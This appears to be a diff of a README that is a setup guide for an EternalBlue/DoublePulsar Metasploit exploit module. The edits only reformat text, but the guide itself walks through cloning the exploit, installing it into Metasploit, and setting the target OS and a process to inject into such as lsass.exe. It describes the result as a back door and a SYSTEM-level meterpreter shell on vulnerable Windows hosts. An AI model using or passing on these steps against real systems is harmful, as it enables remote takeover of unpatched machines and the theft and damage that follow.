@@ -8,7 +8,7 @@ One thing I could never find was a full setup guide.  I had to piece this togeth
 
 # Installation Setup
 
-	1.) git clone (https://github.com/w0rtw0rt/EternalBlue) to any directory
+	1.) git clone https://github.com/w0rtw0rt/EternalBlue to any directory
 	2.) Place eternalblue-doublepulsar.rb file into the /usr/share/metasploit-framework/modules/exploits/windows/smb folder
 	3.) open terminal
 	4.) dpkg --add-architecture i386 && apt-get update && apt-get install wine32
@@ -26,7 +26,10 @@ One thing I could never find was a full setup guide.  I had to piece this togeth
 	16.) set TARGET *target OS - Windows 2008/7 down to 2003/XP*
 	17.) set PROCESSINJECT *running process - use lsass.exe (x64) or svchost.exe (x86) or explorer.exe if user is logged in*
 
-At this point, when you run this module for the very first time, wine will initialize and the exploit will fail stating that certain dependencies could not be run.  After the initialization, run the module again and all dependencies will be set up.  The module should complete and if your target is vulnerable, it will open the back door and inject the auto-generated payload to the target.  This should bring back a meterpreter shell with system level access (NTAuthority/System).
+At this point, when you run this module for the very first time, wine will initialize and the exploit will fail stating that 
+certain dependencies could not be run.  After the initialization, run the module again and all dependencies will be set up.  
+The module should complete and if your target is vulnerable, it will open the back door and inject the auto-generated payload 
+to the target.  This should bring back a meterpreter shell with system level access (NTAuthority/System).
 
 # Troubleshooting
     Q. Why did my meterpreter shell die?
